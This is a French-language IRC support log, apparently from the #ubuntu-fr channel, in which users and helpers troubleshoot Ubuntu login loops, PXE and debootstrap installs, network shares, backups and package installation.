boujour je suis a la recherche de qq qui maitrise le mail sous ubunutu	poses toujours ta question...
ᴖ_ᴖ	je vous juste faire plus court ;)
(meme si je vois pas bien l'interet dans ce cas precis)	quel solution me conseil tu pour faire une installation d'un systéme bootant via le réseau et étant éxécuté sur des postes clients?
depmod -a ?	pour moi?
J'aimerai beaucoup être aidé pour résoudre ça : http://forum.ubuntu-fr.org/viewtopic.php?id=1960411	de plus, que ça soit ici ou sur le forum, ça n'est pas vraiment détaillé, on ne comprend pas ce qui pose problème
J'aimerai beaucoup être aidé pour résoudre ça : http://forum.ubuntu-fr.org/viewtopic.php?id=1960411	le spam, c'est pas vraiment la bonne technique
Mon systéme semble pas trouver le fichier modules.dep.bin depuis que j'ai voulu installer ubuntu-desktop sur ubuntu bootstrap.	un jour tu feras une question compréhensible ?
un jour tu feras une question compréhensible ?	l'écris, c'est pas mon truc. Je fais au mieux.
je vais voir ça	tu es débutant?
un page sur le ubuntu ?	c'est plus un sujet a poser sur le canal #python-fr, tu y sera mieux aide.
mais vous avez pas plus de détail	le shebang, c'est pas ubuntu, mais du shell.
a dsl je connais pas att je vais voir	c'est pour cela que l'on te le dit.
ce que je dois faire c'est d'ajouter une commande sur le shell "count arg"	tu l'execute ou et comment?
quelqu'un sais comment je peux faire une tell chose ?	suffit d'appeler le compilateur python avec ton sheban
ah il manque ""	tu pourrais même ajouter que : uname -m pour avoir le résultat hardware, et uname -i pour savoir quelle version d'Ubuntu est installée
lol casanova	il te faudrait un home à toi, et transferer tes fichiers de ton ancien home nope ?, comme tu veux pas restaurer le backup integralement
je dois lancer fresh install?	?_?
comment faire?	il te faut l'outil dconf déjà
salut le network manager de mon systeme n'affiche plus dans la zone de notification	http://i.stack.imgur.com/nE8LJ.png avec dconf tu dois pouvoir le faire reapparaitre
à faire en lignes de commandes ou dans un fichier config ?	juste lire logiquement ça devrait être ok
merci beaver	regarde
pastebinit ne marche plus	euh, donc, à configuration équivalente ou presque (le kernel est en generic), ça fonctionne plus ?
mais quel kernel	c'était ok au préalable ou pas ? :/
c'est Xorg.1.log	avec la session invitée c'est idem ?
moche :/ idem avec la session invité ?	Xorg.0.log : http://paste.ubuntu.com/14007128/
y'a quoi dans ton  .xsession-errors ?	.xsession-errors : http://paste.ubuntu.com/14003195/
le probleme ? c'est quoi ? au juste, 'lut	le chargement de la session crash
J'ai un installation minimal via debootstrap, lancé par un boot pxe dans une virtualbox. Le réseau marche mais je n'ai pas dns!	je dirais que le dhcp pourrait fournir les info dns
je dirais que le dhcp pourrait fournir les info dns	normalement, il le fait! c'est ainsi que marche tout le réseau!
Quel est la commande pour tester si un disque est utilisé?	c'est-à-dire, « utilisé » ?
Même problème avec le 14.04	les TTY fonctionnent ?
ouai et ICEautorithy aussi	alors il suffit de les réattribuer à ton user
et en plus sur l'écran de chargement ça marque ubuntu studio maintenant :-)	tu peux nous envoyer ce paste ? ls -l ~/.Xauthority | pastebinit
comme je fait pour le retirer Marmotte c'est une amd Marmotte	essaie déjà de renommer le ~/.Xauthority, on verra après pour le driver graphique ^^
comment on fait Marmotte ?	mv ~/.Xauthority ~/.Xauthority.old
llvm, mesa, xsession-xorg, et le kernel	essaie de renommer le fichier ~/.Xauthority
et impossible de lire var/log/xorg.0.log	il semblerait qu'il n'arrive effectivement pas à charger ta session X... mais par contre, je n'ai aucune idée de coment corriger ça :/
je n'arrive pas a utiliser pasebinit Marmotte	pastebinit fichier
pastebinit fichier	http://paste.ubuntu.com/14003195/
La seul ligne d'ailleur!	xubuntu-desktop est dans universe, tu n'as que main
xubuntu-desktop est dans universe, tu n'as que main	je dois ajouter ppa ou bien simplement un ligne universe?
je dois ajouter ppa ou bien simplement un ligne universe?	il suffit d'ajouter universe à la fin de la ligne
Mais je ne peux même pas faire d'apt-get install.	normalement l'utilitaire disque est installé par défaut!
davlefou merci mais je ne sais pas ce qu'est l'utilitaire disque. J'ai essayé d'installer smartmontool depuis ce lien :https://www.guillaume-leduc.fr/surveillez-la-sante-de-vos-disques-sous-linux-avec-smartmontools.html	je pense que tu as un probléme de disque.
ubuntu, je suis parti apt-get install debootstrap!	il y a quoi comme dépôts, dans ton debootstrap ?
Je ne peux pas faire d'apt-get install non plus.	généralement, c'est matériel dans ce cas! Utilise l'utilitaire disque pour avoir des informations sur l'état de ton disque!
Pour info par rapport à mon problème:  cat /proc/version Linux version 3.11.0-26-generic (buildd@comet) (gcc version 4.8.1 (Ubuntu/Linaro 4.8.1-10ubuntu8) ) #45-Ubuntu SMP Tue Jul 15 04:02:06 UTC 2014	Pourquoi ton disque est en écriture seulement? As tu un probléme de disque?
Pourquoi ton disque est en écriture seulement? As tu un probléme de disque?	merci pour ton aide.
ce sont simplement les mêmes que pour Ubuntu	j'ai fait un base via debootstrap et quand je search xubuntu-desktop, il ne le trouve pas!
j'ai fait un base via debootstrap et quand je search xubuntu-desktop, il ne le trouve pas!	tu as debootstrap un Debian, ou un Ubuntu ?
Quel sont les repositorie pour xubuntu et lubuntu?	je n'avais pas vu ton timeout
tous les crash qu'il y a :-) et je ne peut même pas le paste	tu as l'outil pastebinit en console
Bonjour, quel sont les repositorie pour xubuntu et lubuntu?	lis plus haut, tu as eu la réponse
bonjour tout le monde, j'ai un sacré problème, lorsque je me logue sur lightdm et bien je reviens sur l'écran ou il faut taper son mot de passe encore et encore et je n'arrive pas a trouver sur le net pourquoi...	tu peux te connecter en tty ?
pour passer en qwerty c'est setxkbmap us	merci
Quel est la commande pour mettre le clavier français?	 setxkbmap fr
ben avant visiblement ca marchait, et maintenant les fichier n y sont plus	tu peux installer le ppa pour trusty
donc j en reviens à ma question de depart.... il y as un moyen de forcer une install, de cette source par exemple?	tu es allé voir mon lien ?
ca me sort Le paquet « pantheon-files » n'a pas de version susceptible d'être installée	--> sinon : http://askubuntu.com/questions/614326/how-to-install-pantheon-desktop-on-ubuntu-15-04
sinon : http://askubuntu.com/questions/614326/how-to-install-pantheon-desktop-on-ubuntu-15-04	je ferai un petit grillagde de dd...
je ferai un petit grillagde de dd...	héhéhé :)
sudo add-apt-repository ppa:elementary-os/daily	daily ? oO
nzo, j aimerais re installer Pantheon File manager dans Ubuntu 15.10	http://askubuntu.com/questions/635019/how-to-install-pantheon-on-ubuntu-15-04
oui je crois que c est ca https://launchpad.net/~elementary-os/+archive/ubuntu/stable	ah marrant … plank qui est dans élémentary-os a été implanté dans Mate
vous diriez quoi si votre chef stockait des info sur vous de type delicates genre numéro de secu arrets de travail etc etc sur un google drive?.... je trouve ça abusé d'utiliser ça dans le cadre pro...	heu .. je ferais un scandale ?
s>t	tu cherches apres quoi?
"<cemoi> je suis fou"	à oui... of course
15.04 je crois	mmh en tout cas pantheon n'est pas dans le main de vivid (15.04)
du coup je doit installer quelquechose d autre pour que ca marche?	mmh … attends
je peux pas forcer d installer la version pre 15.10?	ou paquet retiré totalement de la distro
aucune version du paquet pantheon-files n'est disponible, mais il existe dans la base de données. Cela signifie en général que le paquet est manquant, qu'il est devenu obsolète ou qu'il n'est disponible que sur une autre source  E: Le paquet « pantheon-files » n'a pas de version susceptible d'être installée	regardes du coté des dépôts proposed
quand je dis monter je veux dire monter une machine dédié au backups quoi	pas concurrence, merci! Trouve toi ton propre défaut!
pas concurrence, merci! Trouve toi ton propre défaut!	hu? rien compris
perso, j'ai tendance à utiliser rsnapshot pour gerer les sauvegardes chez des particuliers, et backuppc sur les infras	backuppc je voudrai en monter un en ce moment mais on me dit que un serveur de backup ça ne sert à rien....
4h que j ai des messages d erreurs... ca marchait tres bien avant	Docteur Who?
ya aussi duplicity qui est bien mais il faut tout scripter soi meme	ba je me ser de backupc
bonjour, y-a-il une solution de backup facile sous ubuntu qui permet de faire des bacukps incrementaux ?	oui regarde du coté des interfaces graphique de rsync
sinon il y as un moyen de changer les dossiers marrons degeu de nautilus et d en avoir des bleus par exemple?	oui
parfois je devrais reflechir avant de parler...	probablement, il faut demander à alis
sur l'académie c'est la bagarre	ils doivent avoir leur propre salon (probablement anglophone), au pire tu peux t'y connecter et comparer la liste des gens connectés là bas avec la liste des gens connectés ici
bonsoir es que qq taf pour le projet edubuntu par ici?	Ne devrais tu pas plutôt exposer ton probléme?
j'ai mon proxy qui a sauté entre temps :(	beaver
libqt5feedback5 5.0~git20130529-0ubuntu3	hm, aide toi un peu :), on en était ou ?
ça marche plus le paste	utilise https://pastee.org/
nan	il retourne quoi ?
oui j'ai installé la 3.6	?
LLVM ERROR: ran out of registers during register allocation	pour voir
up ma question :)	déjà primo :), ça dépend grandement de l'utilisation que tu comptes avoir avec ton matériel, secondo, ta question concerne Ubuntu certes, mais c'est hardware, nous parlons plus de l'o/s Ubuntu mais de son "hôte" qui l'accueil, je pense que le offtopic serait le channel adéquat pour cette question, tu es le bienvenue -> #ubuntu-fr-offtopic
moi c'est 3.13.0.72	c'est toi qui indique ta version d'ubuntu et non moi :)
je suis inscrit sur launchpad	tu veux essayer ?
un peu plus long	ne marche pas
svp	LANG=C tonprogramme
s/avec/a (a un vendeur), désolé pour le pseudo' hs, mais c'est une réalité qui concerne Ubuntu pour le coup	dell fait des lappy certifiés ubuntu
encore merci	http://www8.hp.com/us/en/campaigns/ubuntu/index.html aussi
si vous avez des conseils, ca m'interesse ! Merci	http://www.ubuntu.com/certification/desktop/
je veux ouvrir le port 4900	par défaut Ubuntu a un pare-feu, mais je crois qu'il est désactivé par défaut… il faut donc agir sur ton routeur
tu vas dans Boîte de saisie, et dans la liste des langues à utiliser pour la vérification orthographique, tu mets: fr_FR,en_US	Je viens de voir et d'ajouter en_GB :)
il faut que tu fasses un tour dans les préférences d'HexChat	Je penses aussi
il faut que tu installes les dictionnaires correspondant (aspell ou hunspell je crois)	Au début, je n'avais que l'anglais, j'ai installé le français dans huspell et maintenant je n'ai plus que le français (sur l'autre PC, j'ai les 2 en même temps)
pour moi ça marche, l'anglais et le français sont reconnus dans HexChat	Le truc qui me chiffonne c'est qu'il me semblait que je pouvais les voir avant (toujours avec animate, mais il me semble que je compilais avec pdfLaTeX et maintenant avec XeLaTeX), et que le prof à qui j'envoie ces rapport m'a dit qu'il n'avait aucun soucis pour les lire avec sont lecteur PDF par défaut de sa version Linux.
y compris l'animation je pense	Oui, j'adapte la langue quand je vais sur #ubuntu ;) (par contre, le correcteur ne s'adapte pas encore dans hexchat, faudra que je trouve comment j'avais fais sur l'ancien PC).
Après 30 minutes sans réponses sur #ubuntu-fr, c'est honnête de poser sa question sur #ubuntu ?	tu as le droit, à condition de le faire en anglais
salut, quelqu'un peut me donner la commande pour afficher les caractéristiques de ma carte réseau wlan0 ?	ifconfig / iwconfig
c est pas monitoring ?	plus oui
chez moi, j'ai un long câble HDMI pour le "mirroring" d'un de mes deux écrans sur la TV :D	moi j'ai plus pensé à un mirroring sur un serveur...
moi j'ai plus pensé à un mirroring sur un serveur...	ouais, je pensais à un mirroring de service quelconque, mais le serveur complet, ça marche aussi :D
(pour info, quand tu as dit "mirroring", le premier truc qui m'est venu à l'esprit, c'est apt-mirroring, et j'étais plutôt en train de me demander de quel service tu parlais, sans penser un seul instant à de l'affichage :P)	il me faudrait un hdmi de 7 m c est long
il me faudrait un hdmi de 7 m c est long	j'en utilise un de 5m sans aucun souci ^^
ca casse pas comme ca un bus sata quand meme	 Non en fait tu n'as pas compris, il y a un cable pour relier le hdd à la CM
c est un laptop Sun_ ?	 Oui
Scala2_ext	c'est un canal qui permet d'avoir des discussions autour du libre … il peut y avoir de la politique par moment (de manière officieuse :D), ça cause hardware aussi comme secu info'
c'est un canal qui permet d'avoir des discussions autour du libre … il peut y avoir de la politique par moment (de manière officieuse :D), ça cause hardware aussi comme secu info'	 Ah ok merci !
comment  le cable sata est soudé a la CM ?	 OUais on dirait bien
va faloir peut etre changer de CM Sun_	 Fait chier
sur ton live cd tu as acces au hdd ?	 Non en fait le HDD est déconnecté de la carte mere et impossible de le reconnecter car le cable permettant de relier les deux est partie de la CM
essaye sur #ubuntu-fr-offtopic peut être Sun_ :)	 Merci, c'est quoi exactement comme channel ?
tu as des logiciels comme multisystem qui propose une option pour avoir un mode persistant sur ton liveusb, mais il n'est pas proposé par défaut	 Ok merci
par exemple, pour PostgreSQL, quand on le relance, il ne consomme quasiment rien, et au fur et à mesure qu'on lui fait des requêtes, il met des trucs en cache, et après, la conso de ram devient stationnaire	là pour le coup non il augmente, on a eu sur une VM de 500 Mo apache à 390 / 400 mo
sinon ya pas un depot ubuntu qui contiendrais des paquets anciens ?	pourquoi gcc4.3 ?
si je pouvais dormir plus, ça m'arrangerait, mais c'est offtopic :)	:)
suppose que c est generale	plutôt que faire un sondage, qui n'est probablement d'aucune utilité pour ton problème, pose directement ta question...
je	je n ai pas de probleme actuellement
sur ce canal?	boutade
boutade	tu?
La sauvegarde est géré de façon identique entre la version Windows et Linux, donc quand j'ai besoin de l'addon, j'utilise Wine (le logiciel tourne parfaitement bien sous Wine) et je synchronise les différentes sauvegardes avec Unison :D	sympa se soft, merci =)
quelqu'un s'y connait en Xorg ou en Ibook?	peut etre essayer un autre bureau léger, je suppose que le driver graphique vient avec le bureau (je suis un noob en linux, c'est juste pour meubler le silence...)
je voudrais installer gcc-4.3 mais il est plus dans les depots	pourquoi ce besoin?
mais je te remercie de ton aide	http://www.gnu.org/software/grub/
je suis coincé c'est pour cela que je cherche le rebootage à distance	sans trop chercher... suffit de passer à modem extern en plus, ton fax marchera directement sous linux!
c'est pour cela que je voudrais dire à grub : au prochain coup tu lances tel Os	pour info, l'adsl fonctionne pareil, c'est toujours des porteuses! le rtc utilise un solution similaire au norme rs232/234
bonjour je cherche des personnes connaissant la programmation GRUB pour lancer un os de manière cyclique tous les "X" demarrages	pardon?
c'est con, il me restait du popcorn	garde le au chaud, je pense qu'il y aura un suite!
c est officiel j abandonne le nfs je vais partir vers du smb	cela me semble plus simple.
Ok	ça fait plus ou moins office de carte graphique
Sun_ > Ouais enfin si ta co chez toi (sur ton W10) est bof bof, même si ton Lubuntu est fibré, ça ira a la vitesse de la co la plus faible (donc ton W10) :x	quoi ? les tuyaux ne sont pas élargis dans ces cas-là ? c'est scandaleux :D
En revanche, prends ton temps et lis bien toute la proc avant de commencer, parce que j'ai galéré de mon côté (bon on est là si t'as besoin d'aide :D )	 Ouais mais genre je telecharge un film apres je le lit en streaming depuis w10
!wiki openvpn	http://doc.ubuntu-fr.org/openvpn | http://doc.ubuntu-fr.org/administration | http://doc.ubuntu-fr.org/securite
Un VPN, c'est long à mettre en place, relativement chiant (surtout pour créer la clef truc-machin), mais c'est faisable, surtout avec la proc	 d'acc donc j'vais aller voir des tutos pour creer un vpn
je te rassure, on en fait tous des boulettes :)	merci ça me rassure lol
le réseau local c'est dans ta maison Sun_ ^^	 Oui j'suis vraiment con des fois
Non je parle niveau serveur	 En fait j'ai rien mis en place j'ai juste partagé mon dossier avec shares-admin
ce serait pas plus simple un client FTP ?	 Oui mais je voudrais y acceder comme si c'étit un dosier d'un reseau local
Yep, parce que NFS c'est utilisable que sur des réseaux de confiance	juste une précision (je lague et je viens de backloguer): crypter ca se fait avec une pelle, pour creuser une crypte et mettre ton disque dur dedans, mais tu veux probablement le chiffrer
cedrxl > Ton lien pour le chiffrement, il est solide ? (je suppose que plus le MdP est solide, plus la sécurité est optimale ?)	voir meme debutant
Si oui, tu y as écrit quoi ?	je suis pas expert secu ubuntu
pour info la réponse était echo $DESKTOP_SESSION  ;-)	cela me rappels quelque chose! Tu vois quand tu veux, tu peux!
cela me rappels quelque chose! Tu vois quand tu veux, tu peux!	hé hé ...oui, j'avoue avoir trouvé plus de courage a regarder dans la doc que toi à me répondre xD ;-)
Heu... Je suis désolé dav mais je ne comprends pas la question :s	es ce que tu boot sur la clé usb?
?	merci..oui je sais celui que j'utilise mais comment savoir quand on a pas le pc en face et que l'utilisateur ne sait pas
....de nomodeset, mais toujours cet écran noir. Je suis complètement paumé.  Merci d'avoir lu :) !	es ce que systéme te permet de lancer un systéme en boot,
sinon essaie f2	rassure moi t as pas ete jusqu a chopper la doc de l ordi?
f 12 je pense que c'est la bonne touche j'ai vu ca sur un forum. nota: je ne suis pas tres bon en iformatique	comme je t'ai dit, au démarrae de l'ordi il doit t'afficher sur quel bouton appuyer pour accéder au choix de démarrage/boot
Salut, j'ai un souci avec une nouvelle installation. Je suis incapable de m'authentifier via l'interface graphique (aucun message d'erreur) mais si j'essais dans un TTY avec les mêmes infos ça fonctionne!	active le clavier virtuel
personne socialement abandonné?	tu fais quoi dans la vie ?
sinon Puppet ça juste work	en vrai, ce qu il lui faut, c est une semaine avec un mec qui maitrise
si tu veux te limiter à du full SSH, Ansible est plus adapté que Puppet	voila le nom de l autre truc, merci
en plus c'est pas donné	si tu 5k machine a gére et une infrastructure, cela ne pas être gratuit du tout!
il y a 5000 machines a gerer	prensd un presta, il t expliquera pourquoi tout le monde utilise ssh pour ca, pourquoi c est adapté, et comment bien s en servir
c est trop limite	limite? Tu plaisante j'éspére?
vous vous servez de quoi comme soft de prise de main a distance ?	ssh evidement!
ssh evidement!	tu accedes juste au dique ??
pas moi eux	pourquoi eux?
presta remote	vous étés des dinosaures!
cool	pourquoi sur ta région? Tu fais un demande sur le monde!
surtout qu'il y a beaucoup de machines a migrer	tu sais, l interet de l informatique, c est que ca permet de communiquer peu importe les distances
c est quand meme triste de galerer comme ca	c'est quoi ton souci ?
es ce qu'il faut compiler son noyau pour avoir le support du nfs?	non
ok j'essaye	fait voir ton tutoriel
parce que c est une vrai usine a gaz	aurais tu copier collé cette ligne d'un tutorial?
apres le souci peut venir du parametrage du Qnap	aurait tu copier collé cet ligne d'un tutorial?
je suis vraiment debutant	soit tu fait tail -f /var/log/syslog pour suivre les erreur de montage, soit tu le fais avec le mount, c'est selon moi plus simple!
ah dsl	https://doc.ubuntu-fr.org/samba
https://doc.ubuntu-fr.org/samba	 Merci j'vais aller voir
en faite j ai un qnap et je voudrais monter mes partage reseau automatiquement sur le bureau	fait un montage via mount a la main, quand cela te conviendra tu le passera dans la fstab
l un de vous a deja monter un partage de dossier en nfs ?	ta ligne, c'est du fstab?
Vous voyez quelque chose qui cloche ?	c'est a dire?
oui	C'est ma faute, j'étais parlé de deux choses dans prévenir.
SI tel est ta question, oui j'y arrive avec filezilla	la ligne ne t'étais pas destiné! C'est pour la création machine sans disque dur boot en réseau.
tu veux dire est ce que j'arrive à acceder à mon serveur via un client ftp ?	tftp? c'est ce mot qui te bloque?
Merci	tu es débutant?
Et autre question, puis-je acceder à un dossier mon serveur lubuntu desktop despuis windows un peu comme si j’accédais à un dossier d'un reseau local ?	samba aussi!
!wiki samba	http://doc.ubuntu-fr.org/gsambad
salut, vous sauriez comment je pourrai regrouper 3 pdf en un seul ?	il y a des outils pour cela regarde sur ubuntu pdf
Je suis pas sur que tous soit nécéssaire, mais je vais inspecter aprés!	si ça t'intéresse, l'organisation sur mon PXE http://hastebin.com/uzidesivaw.coffee
c'était le probléme, manque des fichiers avec menu.c32, logique!	quels fichiers ? pourquoi ?
si tu ne sais pas pourquoi, ça résoudra peut être ponctuellement ton problème, mais en cas d'autre souci, tu recommenceras à galérer	j'essaye de comprendre aussi!
ou peut être un truc qui se charge d'afficher le menu, mais en tous cas, je doute que ce soit un exécutable à lancer directement	apparement, je viens de trouver un liste de fichier à copier avec, je test!
quand on fait un boot pxe, es ce que le ficher menu.c32 est un excutable seul? Cela semble bloqué à ce niveau!	menu.c32, c'est généralement un fichier texte, pas un exécutable
 Cependant, je ne vois pas trop comment diagnostiquer ça..	tu peux regarder les logs du kernel
J'ai un doute que le lag soit provoquer par ma carte réseau	nop, mais le but aurait été que tu le laisses tourner de façon visible dans un coin
1) Salut à toi Zic   2) j'utilise Lubuntu	mais pour répondre quand même, non, un ESX se pilote par client Vcenter, interface web Vcenter, ou (déconseillé par VMware) SSH
Peut on manager un serveur ESXI 6 avec Vitual Manager ?	rapport avec ESXi qui est un produit propriétaire de Vmware et Ubuntu en fait :) salut
Salut tlm, comment puis-je identifier sous 14.04 quel processus fait "geler" sporadiquement mon OS? (l'écran fade out en noir quelques secondes et revient à la normal 4-5 sec plus tard) J'ai un i7, 16go de ram et un SSD.	dans le Moniteur système ou htop en terminal ?
" in the user homedirectory " :p	Super ca marche a merveille ;)
Super ca marche a merveille ;)	cool !
de rien, j'espère que ça fonctionnera :p	dit juste pour etre sur .xsessionrc est à mettre dans le home de l'utilisateur?
pas d'aide pour pam/GDM ce soir?	je penses pas que ce soir lié à PAM
est il possible de contourner les dns par defaut de my livebox en installant un serveur dns sur mon ubuntu ?	pas besoin d'installer un serveur DNS
mais c'est bien ce qu'il me semblait ^^	je sais mais comme ça, tu auras les éléments de réponses
rha, j'étais en train de le faire ! :p	u're too slow
u're too slow	yep, et toi tu es trop rapide, ta femme me la dit ! (bwahaha)
je détèste ce genre de soucis…	tu as bien fait un apt-get update avant ?
ça vient d'être pondu	super
l'intérêt de e20 outre sa légèreté c'est que tu as de vrais apports moderne (gestionnaire de fichier et terminology) et tu peux ajuster à peu près tout à tes goûts.	comment on fait pour mettre e20 sur la distro, sur le site de enlightment y a juste le bureau a diownload
peux de bouton ou autre connerie : moi ca me va bien !	j ai bien aimé gnome qd j ai essayé, minimaliste et efficace mais plante avec mon gb..
je pense aussi. (par contre qu'est ce que c beau ;-)	lubuntu c assez beau aussi
e20 c quand même pas tres user-freindly	tu asquel bureau?
fusée	c'est plus pour bidouilleurs mais accessible quand même
je sais jamais où il faut cliquer	lol
salut, je cherche un site pour uploader des video avec un lien de telechargement direct ? pour une amie	imgrush.com le faisait… mais il n'existe plus
!wiki mot de passe	http://doc.ubuntu-fr.org/desactiver_mots_de_passe | http://doc.ubuntu-fr.org/root | http://doc.ubuntu-fr.org/pwgen | http://doc.ubuntu-fr.org/cmospwd | http://doc.ubuntu-fr.org/securite
!wiki samba	http://doc.ubuntu-fr.org/samba | http://doc.ubuntu-fr.org/samba_swat | http://doc.ubuntu-fr.org/gsambad | http://doc.ubuntu-fr.org/autofs_avec_samba
enfin udev... une partie de systemd dorénavant :)	Ahhh je n'avais pas complètement tord, mon honneur est sauvé o/
t'as le automount-open aussi, qui auto-ouvre Nautilus quand tu inseres un média	je vois ça, l'automount était effectivement disable. C'est tout bon merci :)
c'est là que sont stockées les "default-action" au niveau du mount	Je vais regarder, merci bien
Bonjour. Petite question suite à l'upgrade vers la 15.10. Nautilus ne monte plus automatiquement mes clés usb. Une piste ?	tu peux checker la clé "org.gnome.desktop.media-handling" (oui oui, même sous Unity) dans dconf-editor
mais j'arrive pas a comprendre comment il a résolu son probleme, mon anglais est pas assez bon :(	tu devrais voir si ton bios n'a pas un paramêtre autoriser la virtualisation matérielle
svp i need you ! :(	sans expliquer ton problème, peu de monde pourra t'aider...
Avec un peu de chance, je vous contacterai pas ce soir!	n'hésite surtout pas !
En fait je suis au boulot, j'ai noté cette ligne de commande et j'essairai ce soir à la maison. merci encore	alors, ça vaut le coup de revenir à ce moment là :)
Dans executer je tape la ligne de commande? Désolé je suis pas autant calé que vous!!	tu t'en sors ?
C'est moi le nouveau, sur vos conseil , j'ai donc décider installer Libreoffice dans mon Lubuntu. En utilisant la logiteque, installation impossible, voilà les messages: Paquets cassés; Vérifiez si vous utilisez des dépots de tierce partie, si c'est le cas désactivez les. Pouvez vous m'aider? MERCI	première chose : ne t'inquiète pas !
je debute :x enfin pas tout à fait mais bon je focus le php pour le moment	L'un n'empêcherait pas l'autre :p
ca fait cb en euro ?	Au moins 0 !
ok merci	https://doc.ubuntu-fr.org/minecraft#installer_le_jeu_et_la_plate-forme_java
le command c'est sudo top	tu utilises quelle version de java ?
je crois mais j'ai vite arrêté	pourquoi ca ?
tu configures ton bios (le boot sequence), tu regardes si il y'a une option qui parle d'un "keyboard" …	mais les mac n'utilise pas de bios ? oui sur pc je sais faire du dual-boot et je suis dejà allé dans le bios pour modifier l'ordre du boot pour notamment selectionner une clé
mais les mac n'utilise pas de bios ? oui sur pc je sais faire du dual-boot et je suis dejà allé dans le bios pour modifier l'ordre du boot pour notamment selectionner une clé	effectivement, mais au moins, je te trompe pas sur la marchandise, je l'ai indiqué plus haut que la technologie Apple me parle pas des masses n_n
je pense, il peut y avoir une option dans le bios pour l'activer, ou c'est peut être actif par défaut	de toute façon je pense que je vais demander de l'aide irl pour eviter de faire des betises
ok merci beaver	ok, je vois le probleme résolu donc :)
notamment pour faire ta selection quand tu vas booter sur le livecd	oui je me dis aussi mais si on peut brancher un clavier usb ça pourrait peut être marcher
la touche entrée plus exactement, ça va être complexe ^^, tu peux pas brancher un autre clavier ?	oui la touche entrée ne fonctionne plus
oui la touche entrée ne fonctionne plus	ça risque d'être relou
terminaux	sérieusement, qu'est ce que tu arrives pas à comprendre dans mes écrits :(, tailf ~/.mcabber/mcabber.log dans un terminal (vois tu ce qu'est un terminal ?), et tu ouvres un deuxieme terminal et tu lances ton logiciel :), tu vas avoir deux sorties (une par terminal), tu pastebin le tout dans l'url de uBOTu-fr
https://help.ubuntu.com/community/MacBook2-1	ou ça http://zupimages.net/up/15/49/85bq.png
ou ça http://zupimages.net/up/15/49/85bq.png	regarde l'url que j'ai donnée
regarde l'url que j'ai donnée	d'accord je vais regarder
dans un pastebin	tu parles de ça http://zupimages.net/up/15/49/ui6m.png ?
j't'ai perdu à <beaver> donc, bein tailf c'est une commande tu ouvres un terminal, tu tapes la commandes	apres ça
https://erdfisch.de/sites/default/files/ubuntu-mac-1.png ça ressemble à ça ? 'fin est ce ça ?	non ça doit être un 14" c'est un portable
non ça doit être un 14" c'est un portable	justement, il faut des détails, le model exact :)
ok merci	?
je m'y connais vraiment pas en techno' Apple, mais t'as pas une reference de ton Mac ? uNouss	la voici http://zupimages.net/up/15/49/bdcl.png
pas de troub	tu copies/colles les deux sorties sur le site de uBOTu-fr
pourtant le mot de passe est bon, login, rien à dire :) j'ai vérifier le fichier config et tout est en règle	un message d'erreur ?
un message d'erreur ?	non juste ça dans le login : [08:24:24] Connecting to server
ça m'a l'air bien	effectivement, j'ai cru que c'était cette page https://doc.ubuntu-fr.org/apple_imac (completement obsolete)
bonjour à tous j'ai une question concernant une installation, j'ai un vieil ordi sous mac os 10.4.11 dont j'aimerais faire passer sous ubuntu ou une de ses varientes. est-ce possible ? et comment faire Sachant que l'ordi en question à un soucis sur la touche entrée du clavier qui ne fonctionne plus	http://doc.ubuntu-fr.org/mac
http://doc.ubuntu-fr.org/mac	chokovanilla je vais regarder ça alors pour voir si j'y arrive,
non arachne , cette doc est a eviter sauf pour faire un dual boot	pourquoi ça ? ça parle des différents mac, des ubuntus compatibles, et des méthodes d'install possibles
par contre macos 10.4, c'est un ppc que tu as ?	c'est un intel
c'est un intel	mon imac date de 2008 je crois
je pense qu'il manque un bout de la phrase, ça s'arrête après "eux en DHCP avec" chez moi	Du coup on a testé avec les clients windows, eux en DHCP avec DNSMASQ et même problème.
je pensais qu'eventuellement les serveur DHCP et en l'occurence DNSMASQ possedait un parametre pour forcer ce type au moment de l'adressage IP	si je me souviens bien, c'est un truc qui permet à Windows de sélectionner automatiquement certains paramètres de pare feu selon le réseau sur lequel tu te connectes
Lors de la premiere connexion	je connais pas bien windows, et du coup je vois pas à quoi ça fait référence
Oui, j'aurais préfèré installer open office car ce vieux portable je l'ai passé à ma fille. Au collège, ils utilisent Open office. MERCI	honnêtement, tu vas avoir plus de soucis à mettre openoffice que tu vas gagner à avoir exactement le même soft. Les deux softs sont à la base issu du même (openoffice), et le plus vivant est libreoffice
Totale novice , je viens d'installer lubuntu. impécable! J'ai télécharger open office mais je ne sais pas l'installer. En clicant sur le téléchargement il ne se passe rien. J'ai bien compris le principe de la bibliotheque mais je ne sais pas faire pour Open office qui n'en fait pas parti.	utilise libre office à la place
personnes?	peut-être, mais sois patient
sur*	 non !
(en 2 mots histoire de pas passer pour des pollueurs de chan.........................)	sure #ubuntu-fr-offtopic ?
vous allez bien ?	pas la peine de faire des détours, tout le monde va bien (ou pas), pose plutôt ta question :)
pas la peine de faire des détours, tout le monde va bien (ou pas), pose plutôt ta question :)	j'ai pas de question :)
Salut Brioche .	hello
alsamixer	Cela donne pas mal de volumes différents (mais aucun ne me donne actuellement du son). Il signale 2 carte son, une intel et une nvidia (carte graphique)
sur ce bonne nuit.	Bonne nuit
Oh, déjà Ubuntu 15.Et moi qui suis resté sur Trusty Tahr...	privilégie les PC portables sans graphiques dédiés
Parce que j'ai déjà eu une mauvaise expérience avec un Dual Boot Windows 8, genre pas d'option Secure Boot dans le BIOS et impossible de récupérer GRUB alors que Windows plantait à chaque démarrage à cause d'un pilote carte graphique qui  buggait. é_é	sauf que la tu n'as donné aucune indication autre que le CPU et la ram
essayes : adb kill-server && sudo adb devices	non rien
j'essai d'install ubuntu sur ma tablette mpc, mais j'ai aucune device de visible... https://developer.ubuntu.com/en/start/ubuntu-for-devices/installing-ubuntu-for-devices/#prepare-desktop | adb devices	tu as essayer de le lancer en root ?
ça sert à faire de l'entropie ?	pas d'apres le site n_n
pas d'apres le site n_n	j'avais hard codé des requetes dans le plugin seeks pour ne jamais retourner certains resultats du wiki
pour le coté secure, suffit d'avoir un sous domaine "caché" comment recevoir une attaque sans connaitre l'url	ça résout pas grand chose
grilled.	au moins t'es sur d'avoir un acces à ton serveur
il a quoi ce webmin qui vous fait rager ?	ça fait mal son boulot
^^	cette requete devrait retourner null pointer
Je viens de regarder un peu le site du CECL. C'est un super projet !	j'ai encore une question pour toi...
Brioche > http://manpages.ubuntu.com/manpages/utopic/man1/rotter.1.html	excellent... tu sais s'il existe un GUI ?
merci pour toutes c'es infos en tout cas super sympa a vous	les live... pas mieux pour ce faire une idée...
Je pense pas qu'il y ait d'interface plus complète que d'autres. C'est plus une question de préférences.	ok
